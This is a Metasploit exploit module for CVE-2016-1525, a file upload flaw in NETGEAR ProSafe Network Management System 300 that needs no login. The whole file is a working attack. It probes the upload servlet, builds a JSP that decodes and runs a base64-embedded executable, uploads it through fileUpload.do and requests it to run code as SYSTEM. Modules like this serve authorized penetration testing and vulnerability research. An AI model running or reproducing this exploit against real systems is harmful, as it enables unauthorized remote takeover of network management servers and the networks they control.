# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;NETGEAR ProSafe Network Management System 300 Arbitrary File Upload&#039;,
      &#039;Description&#039; => %q{
        Netgear&#039;s ProSafe NMS300 is a network management utility that runs on Windows systems.
        The application has a file upload vulnerability that can be exploited by an
        unauthenticated remote attacker to execute code as the SYSTEM user.
        Two servlets are vulnerable, FileUploadController (located at
        /lib-1.0/external/flash/fileUpload.do) and FileUpload2Controller (located at /fileUpload.do).
        This module exploits the latter, and has been tested with versions 1.5.0.2, 1.4.0.17 and
        1.1.0.13.
      },
      &#039;Author&#039; =>
        [
          &#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039; # Vulnerability discovery and updated MSF module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2016-1525&#039;],
          [&#039;US-CERT-VU&#039;, &#039;777024&#039;],
          [&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2016/Feb/30&#039;]
        ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 5 },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Arch&#039; => ARCH_X86,
      &#039;Privileged&#039; => true,
      &#039;Targets&#039; =>
        [
          [ &#039;NETGEAR ProSafe Network Management System 300 / Windows&#039;, {} ]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Feb 4 2016&#039;))
 
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;TARGETURI&#039;, [true,  "Application path", &#039;/&#039;])
      ], self.class)
  end
 
 
  def check
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;fileUpload.do&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })
    if res && res.code == 405
      Exploit::CheckCode::Detected
    else
      Exploit::CheckCode::Safe
    end
  end
 
 
  def generate_jsp_payload
    exe = generate_payload_exe
    base64_exe = Rex::Text.encode_base64(exe)
    payload_name = rand_text_alpha(rand(6)+3)
 
    var_raw     = &#039;a&#039; + rand_text_alpha(rand(8) + 3)
    var_ostream = &#039;b&#039; + rand_text_alpha(rand(8) + 3)
    var_buf     = &#039;c&#039; + rand_text_alpha(rand(8) + 3)
    var_decoder = &#039;d&#039; + rand_text_alpha(rand(8) + 3)
    var_tmp     = &#039;e&#039; + rand_text_alpha(rand(8) + 3)
    var_path    = &#039;f&#039; + rand_text_alpha(rand(8) + 3)
    var_proc2   = &#039;e&#039; + rand_text_alpha(rand(8) + 3)
 
    jsp = %Q|
    <%@page import="java.io.*"%>
    <%@page import="sun.misc.BASE64Decoder"%>
    <%
    try {
      String #{var_buf} = "#{base64_exe}";
      BASE64Decoder #{var_decoder} = new BASE64Decoder();
      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());
 
      File #{var_tmp} = File.createTempFile("#{payload_name}", ".exe");
      String #{var_path} = #{var_tmp}.getAbsolutePath();
 
      BufferedOutputStream #{var_ostream} =
        new BufferedOutputStream(new FileOutputStream(#{var_path}));
      #{var_ostream}.write(#{var_raw});
      #{var_ostream}.close();
      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
    } catch (Exception e) {
    }
    %>
    |
 
    jsp.gsub!(/[\n\t\r]/, &#039;&#039;)
 
    return jsp
  end
 
 
  def exploit
    jsp_payload = generate_jsp_payload
 
    jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
    jsp_full_name = "null#{jsp_name}.jsp"
    post_data = Rex::MIME::Message.new
    post_data.add_part(jsp_name, nil, nil, &#039;form-data; name="name"&#039;)
    post_data.add_part(jsp_payload,
      "application/octet-stream", &#039;binary&#039;,
      "form-data; name=\"Filedata\"; filename=\"#{Rex::Text.rand_text_alpha(6+rand(10))}.jsp\"")
    data = post_data.to_s
 
    print_status("#{peer} - Uploading payload...")
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;fileUpload.do&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;   => data,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}"
    })
    if res && res.code == 200 && res.body.to_s =~ /{"success":true, "file":"#{jsp_name}.jsp"}/
      print_status("#{peer} - Payload uploaded successfully")
    else
      fail_with(Failure::Unknown, "#{peer} - Payload upload failed")
    end
 
    print_status("#{peer} - Executing payload...")
    send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;], jsp_full_name),
      &#039;method&#039; => &#039;GET&#039;
    })
    handler
  end
end

